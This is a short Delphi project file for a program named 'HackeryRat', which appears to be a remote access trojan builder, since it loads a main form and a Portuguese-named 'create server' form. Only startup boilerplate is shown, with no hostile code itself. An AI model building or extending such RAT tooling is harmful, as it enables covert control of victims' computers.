program HackeryRat;

uses
  Forms,
  UFrmPrincipal in 'UFrmPrincipal.pas' {FrmPrincipal},
  UCriarServidor in 'UCriarServidor.pas' {FrmCriarServidor};

{$R *.res}

begin
  Application.Initialize;
  Application.Title := 'HackeryRat';
  Application.CreateForm(TFrmPrincipal, FrmPrincipal);
  Application.CreateForm(TFrmCriarServidor, FrmCriarServidor);
  Application.Run;
end.
